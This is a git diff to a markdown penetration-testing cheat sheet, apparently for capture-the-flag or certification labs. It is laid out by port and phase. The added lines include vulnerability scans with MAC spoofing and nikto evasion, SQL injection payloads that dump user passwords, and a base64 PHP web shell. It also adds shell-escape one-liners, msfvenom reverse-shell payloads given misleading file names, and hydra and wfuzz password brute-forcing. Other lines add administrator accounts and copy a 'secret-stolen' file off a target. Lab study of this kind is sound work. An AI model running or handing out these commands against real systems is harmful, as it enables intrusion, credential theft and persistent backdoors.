@@ -27,6 +27,10 @@
   - ```nmap -sU -T3 Ip-target -v ``` (Can take forever)
   - ```--source-port 53/67``` (DNS or DHCP)
   - ```nmap --script safe Target -vv```
+  - ```nmap --script vuln Target -vv -oA nmap-vuln```
+  - ```nmap -sC -sV -T3 --script vuln -p- --source-port 53 --spoof-mac cisco 10.13.37.10 -oA vuln-nmap -vv```
+  - ```nmap -p- --script shodan-api --script-args 'shodan-api.apikey=STICKFISH-API-KEY' 10.10.10.10 -vv```
+  - ```nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 10.10.10.10 -vv```
 
 - Port 21
   - Banner grabbing
@@ -41,10 +45,12 @@
   - Banner grabbing / check username
 	  - ```ssh root@192.192.192.192```
 
-- Ports 139, 445
+- Ports 139, 445 (SMB)
   - nmap enumerate if possible with scripts if nothing came up before. perhaps change scan speed to slower one
   - enum4linux
-  - smbclient ```smbclient \\\\ip\\share```
+  - smbclient 
+          - ```smbclient \\\\ip\\share```
+          - ```smbclient -L //10.10.10.10/```
   - try to connect to them to see if they are truly alive
   - Banner grabbing even if booted
   - ```nbtscan [ip-range]``` (https://highon.coffee/blog/nbtscan-cheat-sheet/)
@@ -68,8 +74,14 @@
 	  - 8.0	Windows 8 and Windows Server 2012
   - ```nikto -host ip-target -evasion 8``` (Many others check -H)
   - ```nikto -host 10.11.1.227 -evasion 7``` (Change URL case)
+  - ```nikto -host http://10.10.10.10 -port 8080 -evasion 5```
+  - ```nikto -id admin:admin:Realm_name -host http://10.10.10.10 -dbcheck -evasion 5```
   - ```dirb http://Ip-target -r``` **Different wordlist perhaps**
         - Non-recursive to save time, then inspect further if necessary
+  - ```dirb http://10.10.10.10:8080 -u admin:admin``` (Credentialed)
+  - ```gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.13.37.10```
+  - ```wfuzz -z file,/opt/seclists/Discovery/Web-Content/common.txt --hc 302,404 http://10.13.37.10/FUZZ```
+  - ```wpscan --url http://10.10.10.10/wordpress/```
   - Try nmap ``` -–script=http-enum.nse``` (others available)
   	- ```nmap -T4 --script safe -p80,443 Target_IP -vv```
   - Check site in browser (http/https)
@@ -92,6 +104,9 @@
 		      - ``` union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users' ```
 		      - ``` union select 1,2,3,4,concat(name,0x3a,password),6 FROM users ```
 		      
+- Port 993 / 995
+  - ```openssl s_client -connect 10.10.10.10:993 -quiet```
+  - ```openssl s_client -connect 10.10.10.10:993```
 - Port 3389
   - ```rdesktop -z Target_IP:PORT```
   - Screen shot login screen
@@ -108,6 +123,7 @@
    	- ```nc -nv target-ip port < filename``` (send from kali)
   - upgrade linux shell
 	- ```echo os.system('/bin/bash')```
+	- ```tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh```
 	- ```/bin/sh -i```
    	- ```python -c “import pty; pty.spawn(‘/bin/bash’)”```
 		- ctrl+z backgrounds the shell on local box
@@ -130,11 +146,15 @@
 		- ```cat /etc/redhat-release```
   - SUID
 	  - ```find / -perm -u=s -type f 2>/dev/null ```
+	  - ```find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null```
           - ```nmap --interactive``` then ```!sh``` (Have yet to be lucky enough to find this, much older versions only)
   - Available programs/languages on host:
-	  - which Perl,python etc
+	  - ```which Perl,python```
+	  - ```locate```
   - Transfer Files
-	  - Nc,ncat,wget,curl
+	  - Nc,ncat,wget,curl,scp
+	    - ```tail -f /var/log/apache2/access.log```
+	    - ```scp user@target_ip:/tmp/stickfish/secret /root/secret-stolen```
 	    - ```curl -o theFile http://IP:PORT/theFile```
 	    - ```curl ftp://ftp.domain.com --user username:password```
 	        - Access FTP server (Add file to end of domain to download)
@@ -150,6 +170,7 @@
 
   - Usefull commands
     - ```ver```
+    - ```set```
     - ```dir /a```
     - ```netstat -ano | findstr ":3128"```
     - ```type```
@@ -163,6 +184,9 @@
     - ```net user jeff password123 /add```
     - ```net localgroup "Administrators"``` (List admins)
     - ```net localgroup "Administrators" user /add``` (Add user to admin)
+    - ```netsh firewall show state```
+    - ```netsh firewall show config```
+    - ```$psversiontable```
 
  - Priv esc
    - Still busy gathering info... Have this so far:
@@ -175,9 +199,15 @@
   - ```<?php if(isset($_REQUEST["cli"])){ echo "<pre>"; $cli = base64_decode(urldecode(($_REQUEST["cli"]))); system($cli); echo "</pre>"; die; }?>```
   - url request must be encoded in base64 prior.
 	- ```http://target?cli=%22bHMgLWxhIC92YXIvdG1wLw==%22```
+  - ```msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f elf > stickfish.zip```
+  - ```msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f psh --arch x64 --platform windows -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o stick.ps1```
 - Passwords
+  - wfuzz
+        -```wfuzz -c -v --hc 400,404 -z file,/usr/share/wordlists/rockyou.txt -z file,/usr/share/wordlists/rockyou.txt -d "user=FUZZ&pass=FUZZ" https://10.10.10.120:10000/session_login.cgi```
   - Hydra
         - ```hydra -l admin -P /Passwords.txt Target_Ip rdp```
+	- ```hydra -l administrator -P /opt/seclists/Passwords/Cracked-Hashes/milw0rm-dictionary.txt 10.10.10.10 http-get-form "/downloader/index.php?A=loggedin:username=^USER^&password=^PASS^:Invalid user name or password" -VV```
+	- ```hydra -l root -P /usr/share/wordlists/rockyou.txt -s 10000 10.10.10.10 https-post-form "/session_login.cgi:user=^USER^&pass=^PASS^:Login failed. Please try again." -w10 -t10 -VV -c 5 -f```
   
 - Remote file inclusion (https://sushant747.gitbooks.io/total-oscp-guide/remote_file_inclusion.html)
   - Similar to local file inclusion while not hosted on the target
